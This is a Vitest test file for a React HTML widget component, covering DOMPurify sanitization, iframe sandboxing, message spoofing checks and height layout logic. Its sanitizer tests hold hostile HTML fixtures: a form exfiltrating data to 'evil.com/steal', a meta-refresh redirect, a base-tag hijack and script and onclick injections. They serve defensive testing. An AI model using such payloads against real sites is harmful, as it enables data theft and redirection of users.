import React, { act } from 'react';
import { createRoot, type Root } from 'react-dom/client';
import { renderToStaticMarkup } from 'react-dom/server';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { HtmlWidgetBlock } from '../HtmlWidgetBlock';
import { WIDGET_PROOF_REQUEST_EVENT, WIDGET_PROOF_REQUEST_MESSAGE } from '../html-widget-layout-machine';
import { sanitizeWidgetHtml } from '../sanitize-widget-html';

Object.assign(globalThis as Record<string, unknown>, { React });

describe('HtmlWidgetBlock', () => {
  it('server-renders a bounded loading state instead of committing an empty iframe', () => {
    const block = {
      id: 'w1',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<h1>Hello</h1>',
      title: 'Test Widget',
    };
    const html = renderToStaticMarkup(<HtmlWidgetBlock block={block} />);
    expect(html).toContain('data-html-widget-loading');
    expect(html).toContain('正在准备完整内容');
    expect(html).not.toContain('<iframe');
    expect(html).not.toContain('<body></body>');
  });

  it('renders title bar when title is provided', () => {
    const block = {
      id: 'w1b',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<p>Hi</p>',
      title: 'My Chart',
    };
    const html = renderToStaticMarkup(<HtmlWidgetBlock block={block} />);
    // Title bar with font-medium class
    expect(html).toContain('font-medium');
    expect(html).toContain('My Chart');
  });

  it('uses default height of 300px', () => {
    const block = {
      id: 'w2',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<p>Chart</p>',
    };
    const html = renderToStaticMarkup(<HtmlWidgetBlock block={block} />);
    expect(html).toContain('height:300px');
  });

  it('uses custom height when specified', () => {
    const block = {
      id: 'w3',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<p>Tall</p>',
      height: 500,
      title: 'Tall Widget',
    };
    const html = renderToStaticMarkup(<HtmlWidgetBlock block={block} />);
    expect(html).toContain('height:500px');
  });

  it('bounds an oversized payload height because it is only an initial hint', () => {
    const block = {
      id: 'w-hint',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<p>Tall</p>',
      height: 1_250,
    };
    const html = renderToStaticMarkup(<HtmlWidgetBlock block={block} />);
    expect(html).toContain('height:720px');
    expect(html).not.toContain('height:1250px');
  });

  it('does not expose an iframe sandbox during the server loading state', () => {
    const block = {
      id: 'w4',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<script>alert(1)</script>',
    };
    const html = renderToStaticMarkup(<HtmlWidgetBlock block={block} />);
    expect(html).not.toContain('<iframe');
    expect(html).not.toContain('allow-same-origin');
  });

  it('uses fallback title "Interactive Widget" when no title given', () => {
    const block = {
      id: 'w5',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<p>No title</p>',
    };
    const html = renderToStaticMarkup(<HtmlWidgetBlock block={block} />);
    expect(html).toContain('aria-label="Interactive Widget"');
    // No title bar (no font-medium class)
    expect(html).not.toContain('font-medium');
  });

  // --- F156 D-3: DOMPurify sanitization ---

  it('strips <form> with external action (data exfiltration)', () => {
    const block = {
      id: 'w6',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<form action="https://evil.com/steal"><input name="data"/></form><p>safe</p>',
    };
    const html = sanitizeWidgetHtml(block.html);
    expect(html).not.toContain('evil.com');
    expect(html).toContain('safe');
  });

  it('strips <meta http-equiv="refresh"> redirect', () => {
    const block = {
      id: 'w7',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<meta http-equiv="refresh" content="0;url=https://evil.com"><p>content</p>',
    };
    const html = sanitizeWidgetHtml(block.html);
    expect(html).not.toContain('evil.com');
    expect(html).not.toContain('http-equiv');
    expect(html).toContain('content');
  });

  it('strips <base> tag (URL hijacking)', () => {
    const block = {
      id: 'w8',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<base href="https://evil.com/"><a href="/page">link</a>',
    };
    const html = sanitizeWidgetHtml(block.html);
    expect(html).not.toContain('<base');
    expect(html).toContain('link');
  });

  it('preserves <style> in <head> for full HTML documents (WHOLE_DOCUMENT regression)', () => {
    const block = {
      id: 'w-style',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<html><head><style>body{background:#0f0f1a;color:white;}.flow{display:flex;}</style></head><body><div class="flow">Styled</div></body></html>',
    };
    const html = sanitizeWidgetHtml(block.html);
    expect(html).toContain('<style>');
    expect(html).toContain('background');
    expect(html).toContain('display:flex');
    expect(html).toContain('Styled');
  });

  it('preserves safe HTML and scripts (widget functionality)', () => {
    const block = {
      id: 'w9',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<div><p>Chart</p><script>console.log("widget")</script></div>',
    };
    const html = sanitizeWidgetHtml(block.html);
    expect(html).toContain('Chart');
    // Scripts should be preserved for widget functionality
    expect(html).toContain('script');
  });

  it('strips inline event handlers while preserving <script>-based listeners', () => {
    const block = {
      id: 'w-handlers',
      kind: 'html_widget' as const,
      v: 1 as const,
      html: '<button id="b" onclick="boom()">Go</button><script>document.getElementById("b").addEventListener("click", () => {})</script>',
    };
    const html = sanitizeWidgetHtml(block.html);
    // DOMPurify's default ALLOWED_ATTR carries no on* handlers and sanitizeWidgetHtml
    // deliberately does not add them back, so inline handlers never reach the iframe.
    expect(html).not.toContain('onclick');
    expect(html).not.toContain('boom');
    // The <script>-based equivalent survives — interactivity is still achievable,
    // only the authoring syntax differs. See cat-cafe-skills/rich-messaging/SKILL.md.
    expect(html).toContain('addEventListener');
  });
});

const WIDGET_SIZE_MESSAGE = 'cat-cafe:html-widget-size';

function requireElement<T extends Element>(element: T | null): T {
  expect(element).not.toBeNull();
  if (!element) throw new Error('Expected element to exist');
  return element;
}

describe('HtmlWidgetBlock responsive height contract', () => {
  let container: HTMLDivElement;
  let root: Root;

  beforeEach(() => {
    (globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;
    window.history.replaceState(null, '', '/');
    container = document.createElement('div');
    document.body.appendChild(container);
    root = createRoot(container);
  });

  afterEach(() => {
    act(() => root.unmount());
    container.remove();
    window.history.replaceState(null, '', '/');
    delete (globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT;
  });

  async function renderWidget({ id = 'responsive-widget', height = 300 }: { id?: string; height?: number } = {}) {
    await act(async () => {
      root.render(
        <HtmlWidgetBlock
          block={{
            id,
            kind: 'html_widget',
            v: 1,
            title: 'Responsive widget',
            html: '<main>responsive fixture</main>',
            height,
          }}
        />,
      );
    });
    const widget = requireElement(container.querySelector<HTMLElement>('[data-html-widget]'));
    const iframe = requireElement(widget.querySelector<HTMLIFrameElement>('iframe'));
    const instanceId = widget.dataset.htmlWidgetInstanceId;
    expect(instanceId).toBeTruthy();
    return { widget, iframe, instanceId: instanceId as string, blockId: id };
  }

  it('mounts the secured iframe only after client sanitization is ready', async () => {
    const fixture = await renderWidget();
    expect(fixture.iframe.getAttribute('sandbox')).toBe('allow-scripts');
    expect(fixture.iframe.getAttribute('sandbox')).not.toContain('allow-same-origin');
    expect(fixture.iframe.getAttribute('referrerpolicy')).toBe('no-referrer');
    expect(fixture.iframe.title).toBe('Responsive widget');
    expect(fixture.iframe.getAttribute('srcdoc')).toContain('responsive fixture');
    expect(fixture.widget.querySelector('[data-html-widget-loading]')).toBeNull();
  });

  async function reportHeight(
    fixture: Awaited<ReturnType<typeof renderWidget>>,
    contentHeight: number,
    overrides: {
      source?: MessageEventSource | null;
      origin?: string;
      blockId?: string;
      instanceId?: string;
      bodyScrollHeight?: number;
      rootScrollHeight?: number;
      hasUnmeasurableVisualOverflow?: boolean;
      unmeasurableVisualOverflowValue?: unknown;
      viewportHeight?: number;
      viewportWidth?: number;
      proofRequestId?: unknown;
    } = {},
  ) {
    const viewportHeight = overrides.viewportHeight ?? Number.parseFloat(fixture.iframe.style.height);
    await act(async () => {
      window.dispatchEvent(
        new MessageEvent('message', {
          data: {
            type: WIDGET_SIZE_MESSAGE,
            v: 6,
            phase: 'measured',
            blockId: overrides.blockId ?? fixture.blockId,
            instanceId: overrides.instanceId ?? fixture.instanceId,
            contentHeight,
            bodyScrollHeight: overrides.bodyScrollHeight ?? Math.max(contentHeight, viewportHeight),
            rootScrollHeight: overrides.rootScrollHeight ?? Math.max(contentHeight, viewportHeight),
            hasUnmeasurableVisualOverflow:
              overrides.unmeasurableVisualOverflowValue ?? overrides.hasUnmeasurableVisualOverflow ?? false,
            viewportHeight,
            viewportWidth: overrides.viewportWidth ?? 800,
            ...(overrides.proofRequestId === undefined ? {} : { proofRequestId: overrides.proofRequestId }),
          },
          origin: overrides.origin ?? 'null',
          source: overrides.source === undefined ? fixture.iframe.contentWindow : overrides.source,
        }),
      );
    });
  }

  async function reportPending(
    fixture: Awaited<ReturnType<typeof renderWidget>>,
    overrides: {
      source?: MessageEventSource | null;
      origin?: string;
      blockId?: string;
      instanceId?: string;
      cause?: 'content' | 'viewport';
    } = {},
  ) {
    const {
      source = fixture.iframe.contentWindow,
      origin = 'null',
      blockId = fixture.blockId,
      instanceId = fixture.instanceId,
    } = overrides;
    await act(async () => {
      window.dispatchEvent(
        new MessageEvent('message', {
          data: {
            type: WIDGET_SIZE_MESSAGE,
            v: 6,
            phase: 'pending',
            cause: overrides.cause ?? 'content',
            blockId,
            instanceId,
          },
          origin,
          source,
        }),
      );
    });
  }

  it('auto-fits short content to its measured height', async () => {
    const fixture = await renderWidget({ height: 500 });

    await reportHeight(fixture, 184);

    expect(fixture.iframe.style.height).toBe('184px');
    expect(fixture.widget.dataset.htmlWidgetLayoutState).toBe('ready');
    expect(fixture.widget.dataset.htmlWidgetMeasuredHeight).toBe('184');
    expect(container.querySelector('button[aria-expanded]')).toBeNull();
  });

  it('keeps long content in a bounded preview with a visible recovery path and no iframe scrolling', async () => {
    const fixture = await renderWidget({ height: 1_250 });

    await reportHeight(fixture, 3_160);

    expect(fixture.iframe.style.height).toBe('720px');
    expect(fixture.iframe.getAttribute('scrolling')).toBe('no');
    expect(fixture.iframe.getAttribute('srcdoc')).toContain('overflow: hidden !important');
    expect(container.querySelector('[data-testid="html-widget-overflow-fade"]')).not.toBeNull();
    const expand = requireElement(container.querySelector<HTMLButtonElement>('button[aria-expanded="false"]'));
    expect(expand.textContent).toContain('展开完整内容');
    expect(expand.getAttribute('aria-controls')).toBe(fixture.iframe.id);
  });

  it('expands into the main chat flow and can collapse again', async () => {
    const fixture = await renderWidget();
    await reportHeight(fixture, 3_160);

    const expand = requireElement(container.querySelector<HTMLButtonElement>('button[aria-expanded="false"]'));
    await act(async () => expand.click());

    expect(fixture.iframe.style.height).toBe('3160px');
    expect(fixture.widget.dataset.htmlWidgetExpanded).toBe('true');
    const collapse = requireElement(container.querySelector<HTMLButtonElement>('button[aria-expanded="true"]'));
    expect(collapse.textContent).toContain('收起完整内容');

    await act(async () => collapse.click());
    expect(fixture.iframe.style.height).toBe('720px');
    expect(fixture.widget.dataset.htmlWidgetExpanded).toBe('false');
  });

  it('accepts later measurements after responsive reflow but rejects spoofed sources and identities', async () => {
    const fixture = await renderWidget();
    await reportHeight(fixture, 280);
    expect(fixture.iframe.style.height).toBe('280px');

    await reportHeight(fixture, 1_800, { source: window });
    await reportHeight(fixture, 1_800, { blockId: 'another-block' });
    await reportHeight(fixture, 1_800, { instanceId: 'another-instance' });
    await reportHeight(fixture, 1_800, { origin: 'https://example.test' });
    expect(fixture.iframe.style.height).toBe('280px');

    await reportHeight(fixture, 1_800);
    expect(fixture.iframe.style.height).toBe('720px');
    expect(container.querySelector('button[aria-expanded="false"]')).not.toBeNull();
  });

  it('rejects height samples that feed a parent-applied viewport change back into content height', async () => {
    const fixture = await renderWidget({ height: 300 });

    await reportHeight(fixture, 30, { bodyScrollHeight: 317, viewportHeight: 300, viewportWidth: 800 });
    expect(fixture.iframe.style.height).toBe('317px');

    await reportPending(fixture, { cause: 'viewport' });
    await reportHeight(fixture, 30, { bodyScrollHeight: 334, viewportHeight: 317, viewportWidth: 800 });
    expect(fixture.iframe.style.height).toBe('317px');
    expect(fixture.widget.dataset.htmlWidgetMeasuredHeight).toBe('317');
    expect(fixture.widget.dataset.htmlWidgetLayoutState).toBe('error');
    expect(container.querySelector('[role="alert"]')?.textContent).toContain('依赖视口');
  });

  it('rejects an unreasonable measured height instead of growing the chat flow', async () => {
    const fixture = await renderWidget({ height: 420 });

    await reportHeight(fixture, 100_001, { bodyScrollHeight: 100_001 });

    expect(fixture.widget.dataset.htmlWidgetLayoutState).toBe('error');
    expect(fixture.iframe.style.height).toBe('420px');
    expect(container.querySelector('[role="alert"]')?.textContent).toContain('内容高度异常');
  });

  it('fails closed when generated paint has no trustworthy layout or scroll extent', async () => {
    const fixture = await renderWidget({ height: 420 });

    await reportHeight(fixture, 38, {
      bodyScrollHeight: 38,
      rootScrollHeight: 38,
      hasUnmeasurableVisualOverflow: true,
      viewportHeight: 420,
    });

    expect(fixture.widget.dataset.htmlWidgetLayoutState).toBe('error');
    expect(fixture.iframe.style.height).toBe('420px');
    expect(container.querySelector('[role="alert"]')?.textContent).toContain('无法可靠测量的浮动绘制');
  });

  it('rejects a non-boolean visual-overflow claim from the authenticated frame', async () => {
    const fixture = await renderWidget({ height: 420 });

    await reportHeight(fixture, 38, { unmeasurableVisualOverflowValue: 'false' });

    expect(fixture.widget.dataset.htmlWidgetLayoutState).toBe('error');
    expect(fixture.iframe.style.height).toBe('420px');
    expect(container.querySelector('[role="alert"]')?.textContent).toContain('内容高度异常');
  });

  it.each(['true', '1'])('forces full expansion in export=%s mode', async (exportValue) => {
    window.history.replaceState(null, '', `/?export=${exportValue}`);
    const fixture = await renderWidget({ height: 1_250 });

    await reportHeight(fixture, 3_160, { viewportHeight: 720 });

    expect(fixture.iframe.style.height).toBe('3160px');
    expect(fixture.widget.dataset.htmlWidgetExpanded).toBe('true');
    expect(fixture.widget.dataset.htmlWidgetLayoutState).toBe('pending');

    await reportPending(fixture, { cause: 'viewport' });
    await reportHeight(fixture, 3_160, { viewportHeight: 3_160 });

    expect(fixture.widget.dataset.htmlWidgetLayoutState).toBe('ready');
    expect(container.querySelector('button[aria-expanded]')).toBeNull();
    expect(container.querySelector('[data-testid="html-widget-overflow-fade"]')).toBeNull();
  });

  it('invalidates export readiness while async descendant geometry is being remeasured', async () => {
    window.history.replaceState(null, '', '/?export=1');
    const fixture = await renderWidget({ height: 300 });
    await reportHeight(fixture, 30, { viewportHeight: 300 });
    await reportPending(fixture, { cause: 'viewport' });
    await reportHeight(fixture, 30, { viewportHeight: 30 });
    expect(fixture.widget.dataset.htmlWidgetLayoutState).toBe('ready');

    await reportPending(fixture, { source: window });
    expect(fixture.widget.dataset.htmlWidgetLayoutState).toBe('ready');
    await reportPending(fixture);

    expect(fixture.widget.dataset.htmlWidgetLayoutState).toBe('pending');

    await reportHeight(fixture, 1_038, { viewportHeight: 30 });
    expect(fixture.widget.dataset.htmlWidgetLayoutState).toBe('pending');
    await reportPending(fixture, { cause: 'viewport' });
    await reportHeight(fixture, 1_038, { viewportHeight: 1_038 });
    expect(fixture.widget.dataset.htmlWidgetLayoutState).toBe('ready');
  });

  it('acknowledges an export proof request only after the exact iframe returns its matching v6 sample', async () => {
    window.history.replaceState(null, '', '/?export=1');
    const fixture = await renderWidget({ height: 300 });
    await reportHeight(fixture, 300, { viewportHeight: 300 });
    expect(fixture.widget.dataset.htmlWidgetLayoutState).toBe('ready');

    const postMessage = vi.spyOn(fixture.iframe.contentWindow as Window, 'postMessage');
    await act(async () => {
      window.dispatchEvent(new CustomEvent(WIDGET_PROOF_REQUEST_EVENT, { detail: 'proof-request-1' }));
    });
    expect(postMessage).toHaveBeenCalledWith(
      {
        type: WIDGET_PROOF_REQUEST_MESSAGE,
        v: 6,
        blockId: fixture.blockId,
        instanceId: fixture.instanceId,
        proofRequestId: 'proof-request-1',
      },
      '*',
    );
    expect(fixture.widget.dataset.htmlWidgetProofRequestId).toBeUndefined();

    await reportHeight(fixture, 300, { viewportHeight: 300, proofRequestId: 'proof-request-1', source: window });
    await reportHeight(fixture, 300, { viewportHeight: 300, proofRequestId: 'stale-proof-request' });
    expect(fixture.widget.dataset.htmlWidgetProofRequestId).toBeUndefined();

    await reportHeight(fixture, 300, { viewportHeight: 300, proofRequestId: 'proof-request-1' });
    expect(fixture.widget.dataset.htmlWidgetProofRequestId).toBe('proof-request-1');

    await reportPending(fixture, { cause: 'viewport' });
    expect(fixture.widget.dataset.htmlWidgetProofRequestId).toBe('proof-request-1');
    await reportPending(fixture, { cause: 'content' });
    expect(fixture.widget.dataset.htmlWidgetProofRequestId).toBeUndefined();
  });

  it('fails closed on an invalid proof request ID from the authenticated iframe', async () => {
    window.history.replaceState(null, '', '/?export=1');
    const fixture = await renderWidget({ height: 300 });

    await reportHeight(fixture, 300, { viewportHeight: 300, proofRequestId: 'contains spaces' });

    expect(fixture.widget.dataset.htmlWidgetLayoutState).toBe('error');
    expect(fixture.widget.dataset.htmlWidgetProofRequestId).toBeUndefined();
  });

  it('confirms CSS generated overflow without treating the viewport floor as short content', async () => {
    window.history.replaceState(null, '', '/?export=1');
    const fixture = await renderWidget({ height: 300 });

    await reportHeight(fixture, 30, { bodyScrollHeight: 1_038, viewportHeight: 300 });
    expect(fixture.iframe.style.height).toBe('1038px');
    expect(fixture.widget.dataset.htmlWidgetLayoutState).toBe('pending');

    await reportPending(fixture, { cause: 'viewport' });
    await reportHeight(fixture, 30, { bodyScrollHeight: 1_038, viewportHeight: 1_038 });

    expect(fixture.iframe.style.height).toBe('1038px');
    expect(fixture.widget.dataset.htmlWidgetMeasuredHeight).toBe('1038');
    expect(fixture.widget.dataset.htmlWidgetLayoutState).toBe('ready');
  });

  it('confirms documentElement generated overflow independently from the body viewport floor', async () => {
    window.history.replaceState(null, '', '/?export=1');
    const fixture = await renderWidget({ height: 300 });

    await reportHeight(fixture, 30, { bodyScrollHeight: 300, rootScrollHeight: 1_038, viewportHeight: 300 });
    expect(fixture.iframe.style.height).toBe('1038px');
    expect(fixture.widget.dataset.htmlWidgetLayoutState).toBe('pending');

    await reportPending(fixture, { cause: 'viewport' });
    await reportHeight(fixture, 30, {
      bodyScrollHeight: 1_038,
      rootScrollHeight: 1_038,
      viewportHeight: 1_038,
    });

    expect(fixture.iframe.style.height).toBe('1038px');
    expect(fixture.widget.dataset.htmlWidgetMeasuredHeight).toBe('1038');
    expect(fixture.widget.dataset.htmlWidgetLayoutState).toBe('ready');
  });

  it('does not confirm a root overflow witness with only the body scroll source', async () => {
    window.history.replaceState(null, '', '/?export=1');
    const fixture = await renderWidget({ height: 300 });
    await reportHeight(fixture, 30, {
      bodyScrollHeight: 300,
      rootScrollHeight: 1_038,
      viewportHeight: 300,
    });

    await reportPending(fixture, { cause: 'viewport' });
    await reportHeight(fixture, 30, {
      bodyScrollHeight: 1_038,
      rootScrollHeight: 1_041,
      viewportHeight: 1_038,
    });

    expect(fixture.widget.dataset.htmlWidgetLayoutState).toBe('pending');
    expect(fixture.widget.dataset.htmlWidgetMeasuredHeight).toBe('1041');
  });

  it('discards a generated-overflow proof after content invalidation', async () => {
    window.history.replaceState(null, '', '/?export=1');
    const fixture = await renderWidget({ height: 300 });
    await reportHeight(fixture, 30, { bodyScrollHeight: 1_038, viewportHeight: 300 });
    await reportPending(fixture, { cause: 'viewport' });
    await reportHeight(fixture, 30, { bodyScrollHeight: 1_038, viewportHeight: 1_038 });
    expect(fixture.widget.dataset.htmlWidgetLayoutState).toBe('ready');

    await reportPending(fixture, { cause: 'content' });
    await reportHeight(fixture, 30, { bodyScrollHeight: 1_038, viewportHeight: 1_038 });

    expect(fixture.iframe.style.height).toBe('30px');
    expect(fixture.widget.dataset.htmlWidgetLayoutState).toBe('pending');
  });

  it('does not restore a stale layout proof after the block changes', async () => {
    const fixture = await renderWidget({ height: 300 });
    await reportHeight(fixture, 30, { viewportHeight: 300 });
    expect(fixture.widget.dataset.htmlWidgetMeasuredHeight).toBe('30');

    await act(async () => {
      root.render(
        <HtmlWidgetBlock
          block={{
            id: 'replacement-widget',
            kind: 'html_widget',
            v: 1,
            title: 'Replacement widget',
            html: '<main>replacement fixture</main>',
            height: 500,
          }}
        />,
      );
    });

    const replacement = requireElement(container.querySelector<HTMLElement>('[data-html-widget]'));
    const iframe = requireElement(replacement.querySelector<HTMLIFrameElement>('iframe'));
    expect(replacement.dataset.htmlWidgetLayoutState).toBe('pending');
    expect(replacement.dataset.htmlWidgetMeasuredHeight).toBeUndefined();
    expect(iframe.style.height).toBe('500px');
  });
});
